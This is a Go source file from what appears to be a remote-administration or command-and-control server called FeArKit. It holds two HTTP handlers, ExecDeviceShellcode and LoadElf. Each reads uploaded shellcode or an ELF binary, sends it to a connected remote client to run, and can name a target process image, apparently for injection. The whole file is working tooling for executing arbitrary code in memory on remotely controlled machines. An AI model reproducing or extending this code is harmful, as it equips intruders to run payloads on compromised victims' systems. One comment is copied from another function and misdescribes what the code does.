package shellcode

import (
	"net/http"
	"io"
	"time"

	"FeArKit/server/handler/utility"
	"FeArKit/server/common"
	"FeArKit/modules"
	"FeArKit/utils/melody"
	"FeArKit/utils"

	"github.com/gin-gonic/gin"
)

// ListDeviceProcesses will list processes on remote client
func ExecDeviceShellcode(ctx *gin.Context) {
	var form struct {
		ShellcodeFile string `json:"file" yaml:"file" form:"file" binding:"required"`
		TargetImage string `json:"path" yaml:"path" form:"path"`
	}
	target, ok := utility.CheckForm(ctx, &form)
	if !ok {
		return
	}
	if len(form.ShellcodeFile) == 0 {
		ctx.AbortWithStatusJSON(http.StatusBadRequest, modules.Packet{Code: -1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`})
		return
	}
	//fileSize := ctx.Request.ContentLength
	shellcodeData, err := io.ReadAll(ctx.Request.Body)
	if err != nil {
		ctx.AbortWithStatusJSON(http.StatusInternalServerError, modules.Packet{Code: 1, Msg: err.Error()})
		return
	}

	trigger := utils.GetStrUUID()
	common.Info(ctx, `shellcode`, `exec`, ``, map[string]any{
		`file`: form.ShellcodeFile,
		`targetimage`: form.TargetImage,
	})
	common.SendPackByUUID(modules.Packet{Act: `SHELLCODE_EXEC`, Data: gin.H{`shellcode`: shellcodeData, `targetimage`: form.TargetImage}, Event: trigger}, target)
	ok = common.AddEventOnce(func(p modules.Packet, _ *melody.Session) {
		if p.Code != 0 {
			common.Warn(ctx, `SHELLCODE_EXEC`, `fail`, p.Msg, map[string]any{
				`shellcode`: form.ShellcodeFile,
			})
			ctx.AbortWithStatusJSON(http.StatusInternalServerError, modules.Packet{Code: 1, Msg: p.Msg})
		} else {
			common.Info(ctx, `SHELLCODE_EXEC`, `success`, ``, map[string]any{
				`shellcode`: form.ShellcodeFile,
			})
			ctx.JSON(http.StatusOK, modules.Packet{Code: 0})
		}
	}, target, trigger, 5*time.Second)
	if !ok {
		common.Warn(ctx, `SHELLCODE_EXEC`, `fail`, `timeout`, map[string]any{
			`shellcode`: form.ShellcodeFile,
		})
		ctx.AbortWithStatusJSON(http.StatusGatewayTimeout, modules.Packet{Code: 1, Msg: `${i18n|COMMON.RESPONSE_TIMEOUT}`})
	}
}

func LoadElf(ctx *gin.Context) {
	var form struct {
		ShellcodeFile string `json:"file" yaml:"file" form:"file" binding:"required"`
		TargetImage string `json:"path" yaml:"path" form:"path"`
	}
	target, ok := utility.CheckForm(ctx, &form)
	if !ok {
		return
	}
	if len(form.ShellcodeFile) == 0 {
		ctx.AbortWithStatusJSON(http.StatusBadRequest, modules.Packet{Code: -1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`})
		return
	}
	//fileSize := ctx.Request.ContentLength
	shellcodeData, err := io.ReadAll(ctx.Request.Body)
	if err != nil {
		ctx.AbortWithStatusJSON(http.StatusInternalServerError, modules.Packet{Code: 1, Msg: err.Error()})
		return
	}

	trigger := utils.GetStrUUID()
	common.Info(ctx, `shellcode`, `exec`, ``, map[string]any{
		`file`: form.ShellcodeFile,
		`targetimage`: form.TargetImage,
	})
	common.SendPackByUUID(modules.Packet{Act: `LOAD_ELF`, Data: gin.H{`elf`: shellcodeData, `targetimage`: form.TargetImage}, Event: trigger}, target)
	ok = common.AddEventOnce(func(p modules.Packet, _ *melody.Session) {
		if p.Code != 0 {
			common.Warn(ctx, `LOAD_ELF`, `fail`, p.Msg, map[string]any{
				`shellcode`: form.ShellcodeFile,
			})
			ctx.AbortWithStatusJSON(http.StatusInternalServerError, modules.Packet{Code: 1, Msg: p.Msg})
		} else {
			common.Info(ctx, `LOAD_ELF`, `success`, ``, map[string]any{
				`shellcode`: form.ShellcodeFile,
			})
			ctx.JSON(http.StatusOK, modules.Packet{Code: 0})
		}
	}, target, trigger, 5*time.Second)
	if !ok {
		common.Warn(ctx, `LOAD_ELF`, `fail`, `timeout`, map[string]any{
			`shellcode`: form.ShellcodeFile,
		})
		ctx.AbortWithStatusJSON(http.StatusGatewayTimeout, modules.Packet{Code: 1, Msg: `${i18n|COMMON.RESPONSE_TIMEOUT}`})
	}
}

